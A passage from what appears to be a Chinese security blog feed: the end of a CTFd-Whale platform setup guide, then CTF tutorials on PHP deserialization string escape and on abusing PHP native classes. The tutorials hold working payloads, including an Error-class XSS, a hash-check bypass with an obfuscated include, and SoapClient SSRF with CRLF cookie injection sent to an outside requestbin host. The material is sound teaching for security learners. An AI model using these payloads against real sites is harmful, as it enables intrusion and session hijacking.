--hardcd CTFd&#x2F;CTFd&#x2F;plugins&#x2F; #进入plugins目录#下载插件并确保文件名小写git clone https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;CTFd-Whale.git ctfd-whale#进入ctfd-whalecd ctfd-whale#回退版本git reset 5b32f457e9f56ee9b2b29495f4b3b118be3c57bd --hard #回到第一层CTFd目录cd ..&#x2F;..&#x2F;..&#x2F;#配置docker-composevim docker-compose.yml</code></pre><p>docker-compose.yml，直接复制粘贴就行</p><pre class="line-numbers language-none"><code class="language-none">version: &#39;2.2&#39;services:  ctfd:    build: .    user: root    restart: always    ports:      - &quot;8000:8000&quot; #第一个是访问ctfd的端口，第二个是docker端口映射出去的端口    environment:      - UPLOAD_FOLDER&#x3D;&#x2F;var&#x2F;uploads      - DATABASE_URL&#x3D;mysql+pymysql:&#x2F;&#x2F;root:ctfd@db&#x2F;ctfd      - REDIS_URL&#x3D;redis:&#x2F;&#x2F;cache:6379      - WORKERS&#x3D;1      - LOG_FOLDER&#x3D;&#x2F;var&#x2F;log&#x2F;CTFd      - ACCESS_LOG&#x3D;-      - ERROR_LOG&#x3D;-    volumes:      - .data&#x2F;CTFd&#x2F;logs:&#x2F;var&#x2F;log&#x2F;CTFd      - .data&#x2F;CTFd&#x2F;uploads:&#x2F;var&#x2F;uploads      - .:&#x2F;opt&#x2F;CTFd:ro      - &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock #添加这句即可，别的基本按照官方的不用动    depends_on:      - db    networks:        default:        internal:  db:    image: mariadb:10.4.12 #这里改成10.4.12，10.4.13会出错    restart: always    environment:      - MYSQL_ROOT_PASSWORD&#x3D;ctfd      - MYSQL_USER&#x3D;ctfd      - MYSQL_PASSWORD&#x3D;ctfd      - MYSQL_DATABASE&#x3D;ctfd    volumes:      - .data&#x2F;mysql:&#x2F;var&#x2F;lib&#x2F;mysql    networks:        internal:    # This command is required to set important mariadb defaults    command: [mysqld, --character-set-server&#x3D;utf8mb4, --collation-server&#x3D;utf8mb4_unicode_ci, --wait_timeout&#x3D;28800, --log-warnings&#x3D;0]  cache:    image: redis:4    restart: always    volumes:    - .data&#x2F;redis:&#x2F;data    networks:        internal:networks:    default:    internal:        internal: true</code></pre><p>进入CTFd目录，修改Dockerfile的内容</p><pre class="line-numbers language-none"><code class="language-none">FROM python:3.6-alpineRUN sed -i &#39;s&#x2F;dl-cdn.alpinelinux.org&#x2F;mirrors.aliyun.com&#x2F;g&#39; &#x2F;etc&#x2F;apk&#x2F;repositories &amp;&amp;\    apk update &amp;&amp; \    apk add python3 python3-dev linux-headers libffi-dev gcc make musl-dev py-pip mysql-client git openssl-devRUN adduser -D -u 1001 -s &#x2F;bin&#x2F;bash ctfdWORKDIR &#x2F;opt&#x2F;CTFdRUN mkdir -p &#x2F;opt&#x2F;CTFd &#x2F;var&#x2F;log&#x2F;CTFd &#x2F;var&#x2F;uploadsRUN pip config set global.index-url https:&#x2F;&#x2F;pypi.doubanio.com&#x2F;simpleRUN pip config set install.trusted-host pypi.doubanio.comCOPY requirements.txt .RUN pip install -r requirements.txt -i  https:&#x2F;&#x2F;pypi.doubanio.com&#x2F;simpleCOPY . &#x2F;opt&#x2F;CTFdRUN for d in CTFd&#x2F;plugins&#x2F;*; do \      if [ -f &quot;$d&#x2F;requirements.txt&quot; ]; then \        pip install -r $d&#x2F;requirements.txt -i  https:&#x2F;&#x2F;pypi.doubanio.com&#x2F;simple; \      fi; \    done;RUN chmod +x &#x2F;opt&#x2F;CTFd&#x2F;docker-entrypoint.shRUN chown -R 1001:1001 &#x2F;opt&#x2F;CTFdRUN chown -R 1001:1001 &#x2F;var&#x2F;log&#x2F;CTFd &#x2F;var&#x2F;uploadsUSER 1001EXPOSE 8000ENTRYPOINT [&quot;&#x2F;opt&#x2F;CTFd&#x2F;docker-entrypoint.sh&quot;]</code></pre><p>requirements.txt内容</p><pre class="line-numbers language-none"><code class="language-none">Flask&#x3D;&#x3D;1.1.2Werkzeug&#x3D;&#x3D;0.16.0Flask-SQLAlchemy&#x3D;&#x3D;2.4.1Flask-Caching&#x3D;&#x3D;1.4.0Flask-Migrate&#x3D;&#x3D;2.5.2Flask-Script&#x3D;&#x3D;2.0.6SQLAlchemy&#x3D;&#x3D;1.3.11SQLAlchemy-Utils&#x3D;&#x3D;0.36.0passlib&#x3D;&#x3D;1.7.2bcrypt&#x3D;&#x3D;3.1.7six&#x3D;&#x3D;1.13.0itsdangerous&#x3D;&#x3D;1.1.0jinja2&#x3D;&#x3D;2.11.3requests&gt;&#x3D;2.20.0PyMySQL&#x3D;&#x3D;0.9.3gunicorn&#x3D;&#x3D;19.9.0normality&#x3D;&#x3D;2.0.0dataset&#x3D;&#x3D;1.1.2mistune&#x3D;&#x3D;0.8.4netaddr&#x3D;&#x3D;0.7.19redis&#x3D;&#x3D;3.3.11datafreeze&#x3D;&#x3D;0.1.0gevent&#x3D;&#x3D;21.12.0python-dotenv&#x3D;&#x3D;0.10.3flask-restplus&#x3D;&#x3D;0.13.0pathlib2&#x3D;&#x3D;2.3.5flask-marshmallow&#x3D;&#x3D;0.10.1marshmallow-sqlalchemy&#x3D;&#x3D;0.17.0boto3&#x3D;&#x3D;1.10.39markupsafe&#x3D;&#x3D;1.1.1marshmallow&#x3D;&#x3D;2.20.2</code></pre><p>准备好后开始构建容器，进入CTFd目录</p><pre class="line-numbers language-none"><code class="language-none">docker-compose biuld</code></pre><p>启动镜像</p><pre class="line-numbers language-none"><code class="language-none">docker-compose up -d</code></pre><p>启动完之后将ctfd容器加入到frpcadmin的网络之中</p><pre class="line-numbers language-none"><code class="language-none">docker ps #查看ctfd容器的IDdocker network connect frpcadmin #容器ID </code></pre><p>可以看到ctfd容器已经加入到了frpcadmin容器之中了</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348495.png" alt="image-20230821113536575"></p><p>查看容器运行状态</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348969.png" alt="image-20230821113654613"></p><p>访问 ip:8000进入平台，按需填写内容</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348578.png" alt="image-20230821113902068"></p><p>上方导航栏Admin-&gt;Plugins 配置CTFd Whale相关内容</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348850.png" alt="image-20230821141633201"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348069.png" alt="image-20230821141835333"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348639.png" alt="image-20230821142048736"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348211.png" alt="image-20230821142123914"></p><h2 id="添加题目"><a href="#添加题目" class="headerlink" title="添加题目"></a>添加题目</h2><p>上方challenges处添加题目，选择dynamic_docker创建动态题目</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348868.png" alt="image-20230821142321874"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271355544.png" alt="image-20230821142545317"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348434.png" alt="image-20230821142719030"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348154.png" alt="image-20230821142727231"></p><p>最后不要忘记选择动态分数</p><p>成功部署题目</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348073.png" alt="image-20230821142835370"></p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348601.png" alt="image-20230821142845326"></p><p>flag也是动态flag</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348902.png" alt="image-20230821142949627"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;



&lt;h1 id=&quot;CTFD动态靶场搭建&quot;&gt;&lt;a href=&quot;#CTFD动态靶场搭建&quot; class=&quot;headerlink&quot; title=&quot;CTFD动态靶场搭建&quot;&gt;&lt;/a&gt;CTFD动态</summary>
      
    
    
    
    <category term="技术" scheme="https://mizore.site/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP反序列化字符串逃逸</title>
    <link href="https://mizore.site/article/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"/>
    <id>https://mizore.site/article/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</id>
    <published>2023-07-28T17:11:05.127Z</published>
    <updated>2024-11-24T16:52:08.669Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="PHP反序列化字符串逃逸"><a href="#PHP反序列化字符串逃逸" class="headerlink" title="PHP反序列化字符串逃逸"></a>PHP反序列化字符串逃逸</h2><p>虽然是大一就学的知识点，但是前段时间做题的时候发现又忘了。所以把他记录下来，方便下次查阅。</p><p>反序列化字符串逃逸主要出现在字符串增加或者减少的情况。</p><p><strong>前置知识：</strong></p><p>php的序列化数据中，使用<code>;</code>来分隔不同的字段，使用<code>&#125;</code>来作为结尾。并且序列化时，严格按照字段的长度来读取字符。反序列化的过程严格按照序列化规则来进行反序列化，否则会反序列化失败。</p><p>可以反序列化类中不存在的元素。</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307290109929.png" alt="image-20230728212301109"></p><p>在反序列化不存在元素时需要注意前面的成员数需要与后面的成员数相符合</p><p>字符增加&#x2F;减少函数示例</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php function b($data)&#123; return str_replace(&quot;aa&quot;,&quot;bbbb&quot;,$data);&#x2F;&#x2F;字符串增加 &#125;  function a($data)&#123; return str_replace(&quot;bbbb&quot;,&quot;aa&quot;,$data);&#x2F;&#x2F;字符串减少 &#125;</code></pre><h3 id="字符串增加"><a href="#字符串增加" class="headerlink" title="字符串增加"></a>字符串增加</h3><p>测试代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php function b($data)&#123; return str_replace(&quot;aa&quot;,&quot;bbbb&quot;,$data);&#x2F;&#x2F;字符串增加 &#125;class test&#123;public $student&#x3D;&quot;aa&quot;;public $tecacher&#x3D;&quot;other&quot;;#public $test;&#125;$a &#x3D; new test();$a&#x3D;serialize($a);#$b&#x3D;$a;echo $b&#x3D;b($a).&quot;\n&quot;;var_dump(unserialize($b));</code></pre><p>反序列化结果</p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;test&quot;:3:&#123;s:7:&quot;student&quot;;s:2:&quot;bbbb&quot;;s:8:&quot;tecacher&quot;;s:5:&quot;other&quot;;s:4:&quot;test&quot;;N;&#125;</code></pre><p>可以看到输入的aa已经被替换成了bbbb。字符串实际长度增加了，但是字符串的读取长度并没有增加。所以逃逸了的两个字符bb。</p><p>这里我们可以构造<code>;</code>来提前闭合反序列化数据，实现逃逸。</p><p><strong>所以字符串增加利用的是插入与增加字符相同长度的反序列化数据，然后再利用闭合符号来让插入数据被当做正常内容进行反序列化。</strong></p><p>比如可以把teacher改成如下数据</p><pre class="line-numbers language-none"><code class="language-none">$tecacher&#x3D;&#39;aaaa&quot;;&#125;x&#39;;</code></pre><p>成功反序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">O:4:&quot;test&quot;:2:&#123;s:7:&quot;student&quot;;s:5:&quot;other&quot;;s:8:&quot;tecacher&quot;;s:8:&quot;bbbbbbbb&quot;;&#125;x&quot;;&#125;object(test)#1 (2) &#123;  [&quot;student&quot;]&#x3D;&gt;  string(5) &quot;other&quot;  [&quot;tecacher&quot;]&#x3D;&gt;  string(8) &quot;bbbbbbbb&quot;&#125;</code></pre><p>现在把上面代码test属性注释去掉，然后通过字符串逃逸给test反序列化赋值（一共逃逸26个字符）</p><pre class="line-numbers language-none"><code class="language-none">$tecacher&#x3D;&#39;aaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:4:&quot;test&quot;;s:5:&quot;hello&quot;;&#125;&#39;</code></pre><p>成功反序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">O:4:&quot;test&quot;:3:&#123;s:7:&quot;student&quot;;s:5:&quot;other&quot;;s:8:&quot;tecacher&quot;;s:52:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;test&quot;;s:5:&quot;hello&quot;;&#125;&quot;;s:4:&quot;test&quot;;N;&#125;object(test)#1 (3) &#123;  [&quot;student&quot;]&#x3D;&gt;  string(5) &quot;other&quot;  [&quot;tecacher&quot;]&#x3D;&gt;  string(52) &quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;  [&quot;test&quot;]&#x3D;&gt;  string(5) &quot;hello&quot;&#125;</code></pre><h3 id="字符串减少"><a href="#字符串减少" class="headerlink" title="字符串减少"></a>字符串减少</h3><p>测试代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php function a($data)&#123; return str_replace(&quot;aaaa&quot;,&quot;bb&quot;,$data);&#x2F;&#x2F;字符串增加 &#125;class test&#123;public $student&#x3D;&quot;aaaaaaaa&quot;;public $tecacher&#x3D;&quot;other&quot;;#public $test;&#125;$a &#x3D; new test();$a&#x3D;serialize($a);#$b&#x3D;$a;echo $b&#x3D;a($a).&quot;\n&quot;;var_dump(unserialize($b));</code></pre><p>反序列化结果</p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;test&quot;:2:&#123;s:7:&quot;student&quot;;s:8:&quot;bbbb&quot;;s:8:&quot;tecacher&quot;;s:5:&quot;other&quot;;&#125;</code></pre><p>可以看到student字段的长度标识与其实际字段长度不符合，缺少了4个字符。所以在反序列化过程中会继续向后读取四个字符，也就是读取到<code>:</code>。当然这样的结果是导致反序列化失败。</p><p>对于字符串减少的利用在于<strong>让它把我们不需要的字符都当做字段内容读取掉，那么我们在后面构造的内容就会被当做正常内容进行反序列化，从而实现反序列化任意类</strong>。</p><p>示例如下</p><p>首先计算student字段内容后面的长度</p><pre class="line-numbers language-none"><code class="language-none">&quot;;s:8:&quot;tecacher&quot;;s:XX:&quot;&#x2F;&#x2F;共23个字符</code></pre><p>所以需要构造12组<code>aaaa</code>，并在上面的字段内容开头补上一个字符。同时利用teacher参数构造我们想反序列化的类</p><p>参数设置如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">public $student&#x3D;&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;public $tecacher&#x3D;&#39;a&quot;;s:8:&quot;tecacher&quot;;s:6:&quot;hacker&quot;;&#125;&#39;;</code></pre><p>成功反序列化</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307290109586.png" alt="image-20230728214400510"></p><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>最后提一个我自己在做题的时候遇到的小坑，关于不同类型的成员属性在反序列化后的长度变化</p><ul><li>public无标记，变量名不变，长度不变: s:2:”op”;i:2;</li><li>protected在变量名前添加标记\00*\00，长度+3: s:5:”\00*\00op”;i:2;</li><li>private在变量名前添加标记\00(classname)\00，长度+2+类名长度: s:17:”\00FileHandler_Z\00op”;i:2;</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;



&lt;h2 id=&quot;PHP反序列化字符串逃逸&quot;&gt;&lt;a href=&quot;#PHP反序列化字符串逃逸&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化字符串逃逸&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="技术" scheme="https://mizore.site/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP原生类相关利用学习</title>
    <link href="https://mizore.site/article/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>https://mizore.site/article/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-07-24T16:51:13.391Z</published>
    <updated>2024-11-24T16:52:14.071Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="PHP原生类相关利用"><a href="#PHP原生类相关利用" class="headerlink" title="PHP原生类相关利用"></a>PHP原生类相关利用</h2><p>第一次听到原生类是听一个师傅说的，没想到这么快就在做题的时候遇到了。</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>PHP原生类是PHP的一些内置的类，可以直接调用。因为其包含一些魔术方法，所以可以在反序列化的时候利用。有时候，在题目中出现了反序列化，但是没有给出具体类，一般不是源码泄露再审计，就是利用php的原生类。</p><p>常用的原生类有以下几个：</p><ul><li>Error</li><li>Exception</li><li>SoapClient</li><li>DirectoryIterator</li><li>SimpleXMLElement</li></ul><p>遍历PHP内置类的方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> &lt;?php$classes &#x3D; get_declared_classes();foreach ($classes as $class) &#123;    $methods &#x3D; get_class_methods($class);    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#39;__destruct&#39;,            &#39;__toString&#39;,            &#39;__wakeup&#39;,            &#39;__call&#39;,            &#39;__callStatic&#39;,            &#39;__get&#39;,            &#39;__set&#39;,            &#39;__isset&#39;,            &#39;__unset&#39;,            &#39;__invoke&#39;,            &#39;__set_state&#39;    &#x2F;&#x2F; 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类        ))) &#123;            print $class . &#39;::&#39; . $method . &quot;\n&quot;;        &#125;    &#125;&#125; </code></pre><h3 id="Error内置类进行"><a href="#Error内置类进行" class="headerlink" title="Error内置类进行"></a>Error内置类进行</h3><p>适用条件：</p><ul><li>适用于PHP7版本</li><li>开启报错的情况下</li></ul><p>Error是php7的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code> 的方法，这个方法将异常或者错误对象转换为字符串。</p><p>常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 <code>echo &lt;Object&gt;</code> 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如<code>echo</code>的时候）会触发<code>__toString</code> 方法，这是一种挖洞的新思路。</p><p><strong>类属性（参数）：</strong></p><ul><li>message：错误消息内容</li><li>code：错误代码</li><li>file：抛出错误的文件名</li><li>line：抛出错误在该文件中的行数</li></ul><p><strong>类方法：</strong></p><ul><li><a href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> — 初始化 error 对象</li><li><a href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> — 获取错误信息</li><li><a href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> — 返回先前的 Throwable</li><li><a href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> — 获取错误代码</li><li><a href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> — 获取错误发生时的文件</li><li><a href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> — 获取错误发生时的行号</li><li><a href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> — 获取调用栈（stack trace）</li><li><a href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> — 获取字符串形式的调用栈（stack trace）</li><li><a href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> — error 的字符串表达</li><li><a href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> — 克隆 error</li></ul><p>触发XSS示例</p><p>测试代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$a &#x3D; unserialize($_GET[&#39;whoami&#39;]);echo $a;?&gt;</code></pre><p>可以看到这个测试代码的特点是有反序列化入口但是没给反序列化的类</p><p>POC如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$a&#x3D;new Error(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;);$b&#x3D;serialize($a);echo urlencode($b);</code></pre><p>利用Error错误输出的特点，在做题中可以用来绕过如md5，sha1等的比较</p><p>例题</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">if( ($this-&gt;syc !&#x3D; $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) &#x3D;&#x3D;&#x3D; md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)&#x3D;&#x3D;&#x3D; sha1($this-&gt;lover)) )&#123;          if(!preg_match(&quot;&#x2F;\&lt;\?php|\(|\)|\&quot;|\&#39;&#x2F;&quot;, $this-&gt;syc, $match))&#123;              eval($this-&gt;syc);          &#125; else &#123;              die(&quot;Try Hard !!&quot;);          &#125;</code></pre><p>这段代码可以使用数组绕过，但是使用数组无法进行后续的RCE</p><p>测试代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php $a &#x3D; new Error(&#39;this is a test&#39;,1); echo $a;</code></pre><p>输出结果</p><pre class="line-numbers language-none"><code class="language-none">Error: this is a test in &#x2F;box&#x2F;script.php:2Stack trace:#0 &#123;main&#125;</code></pre><p>可以发现只输出了异常休息内容和塞在行数，并没有输出异常代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php $a &#x3D; new Error(&#39;this is a test&#39;,1);$b &#x3D; new Error(&#39;this is a test&#39;,2) echo $a.PHP_EOL; echo $b;</code></pre><p>输出结果</p><pre class="line-numbers language-none"><code class="language-none">Error: this is a test in &#x2F;box&#x2F;script.php:2Stack trace:#0 &#123;main&#125;Error: this is a test in &#x2F;box&#x2F;script.php:2Stack trace:#0 &#123;main&#125;</code></pre><p>可以看到两个的输出是一样的，但是输入却不同，所以可以利用这个特性来绕过判断</p><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$str &#x3D; &quot;?&gt;&lt;?&#x3D;include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;&#x2F;&#x2F;url取反绕过冒号过滤$a&#x3D;new Error($str,1);$b&#x3D;new Error($str,2);</code></pre><h3 id="Exception-内置类"><a href="#Exception-内置类" class="headerlink" title="Exception 内置类"></a>Exception 内置类</h3><p>Exception内置类和Error内置类用法基本相同，区别在于Exception内置类适用于php5&#x2F;7版本。</p><p><strong>类属性：</strong></p><ul><li>message：异常消息内容</li><li>code：异常代码</li><li>file：抛出异常的文件名</li><li>line：抛出异常在该文件中的行号</li></ul><p><strong>类方法：</strong></p><ul><li><a href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> — 异常构造函数</li><li><a href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> — 获取异常消息内容</li><li><a href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> — 返回异常链中的前一个异常</li><li><a href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> — 获取异常代码</li><li><a href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> — 创建异常时的程序文件名称</li><li><a href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> — 获取创建的异常所在文件中的行号</li><li><a href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> — 获取异常追踪信息</li><li><a href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> — 获取字符串类型的异常追踪信息</li><li><a href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> — 将异常对象转换为字符串</li><li><a href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> — 异常克隆</li></ul><h3 id="SoapClient-类"><a href="#SoapClient-类" class="headerlink" title="SoapClient 类"></a>SoapClient 类</h3><p>SoapClient类是PHP内置类中一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问web服务的PHP客户端。在做题时可用于SSRF</p><p>类方法如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">SoapClient &#123;    &#x2F;* 方法 *&#x2F;    public __construct ( string|null $wsdl , array $options &#x3D; [] )    public __call ( string $name , array $args ) : mixed    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay &#x3D; false ) : string|null    public __getCookies ( ) : array    public __getFunctions ( ) : array|null    public __getLastRequest ( ) : string|null    public __getLastRequestHeaders ( ) : string|null    public __getLastResponse ( ) : string|null    public __getLastResponseHeaders ( ) : string|null    public __getTypes ( ) : array|null    public __setCookie ( string $name , string|null $value &#x3D; null ) : void    public __setLocation ( string $location &#x3D; &quot;&quot; ) : string|null    public __setSoapHeaders ( SoapHeader|array|null $headers &#x3D; null ) : bool    public __soapCall ( string $name , array $args , array|null $options &#x3D; null , SoapHeader|array|null $inputHeaders &#x3D; null , array &amp;$outputHeaders &#x3D; null ) : mixed&#125;</code></pre><p>内置类中有一个<code>__call</code>方法，<code>__call</code>方法被触发后，它可以发送HTTP和HTTPS请求，正是这样它可以被利用到SSRF中。</p><p>构造函数如下</p><pre class="line-numbers language-none"><code class="language-none">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</code></pre><ul><li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li></ul><p>利用SoapClient进行SSRF示例</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$a &#x3D; new SoapClient(null,array(&#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;IP_ADDR:PORT&#x2F;XXX&#39;,&#39;uri&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;IP_ADDR:PORT&#39;));$b&#x3D;serialize($a);echo $b;$c&#x3D;unserialize($b);$c-&gt;a(); &#x2F;&#x2F;调用不存在的方法触发__call()进行SSRF</code></pre><p>但是，由于它仅限于HTTP&#x2F;HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。</p><p>插入cookie示例</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$target &#x3D; &#39;http:&#x2F;&#x2F;requestbin.net&#x2F;r&#x2F;doe3ps5d&#39;;$a &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target, &#39;user_agent&#39; &#x3D;&gt; &quot;WHOAMI\r\nCookie: PHPSESSID&#x3D;tcjr6nadpk3md7jbgioa6elfk4&quot;, &#39;uri&#39; &#x3D;&gt; &#39;test&#39;));$b &#x3D; serialize($a);echo $b;$c &#x3D; unserialize($b);$c-&gt;a();    &#x2F;&#x2F; 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt;</code></pre><p>例题</p><p><strong>bestphp’s revenge</strong></p><p>题目源码如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);$b &#x3D; &#39;implode&#39;;call_user_func($_GET[&#39;f&#39;], $_POST);session_start();if (isset($_GET[&#39;name&#39;])) &#123;    $_SESSION[&#39;name&#39;] &#x3D; $_GET[&#39;name&#39;];&#125;var_dump($_SESSION);$a &#x3D; array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);call_user_func($b, $a);?&gt; array(0) &#123; &#125;</code></pre><p>使用dirsearch可扫出flag.php</p><p>内容如下</p><pre class="line-numbers language-none"><code class="language-none">only localhost can get flag!session_start();echo &#39;only localhost can get flag!&#39;; $flag &#x3D; &#39;LCTF&#123;*************************&#125;&#39;; if($_SERVER[&quot;REMOTE_ADDR&quot;]&#x3D;&#x3D;&#x3D;&quot;127.0.0.1&quot;)&#123; $_SESSION[&#39;flag&#39;] &#x3D; $flag; &#125; only localhost can get flag!</code></pre><p>由<code>$_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;</code>可以推测这里需要通过内网进行访问。由此可以推断出这里需要使用SSRF。</p><p>反观源码，有两个<code>call_user_func</code>可以使用可以调用任意函数。这里能想到的就是使用SoapClient类进行SSRF。但是要使用SoapClient进行SSRF的话需要反序列化触发SoapClient类里的<code>__call()</code>魔法函数。</p><p> 问题是题目里并没有直接给出反序列化接口，但是由题目里的<code>session_start()</code>可以联想到这里要利用<code>session()</code>进行反序列化。</p><p>先利用题目中的</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">if (isset($_GET[&#39;name&#39;])) &#123;    $_SESSION[&#39;name&#39;] &#x3D; $_GET[&#39;name&#39;];&#125;</code></pre><p>写入序列化数据，再根据此处</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">var_dump($_SESSION);$a &#x3D; array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);call_user_func($b, 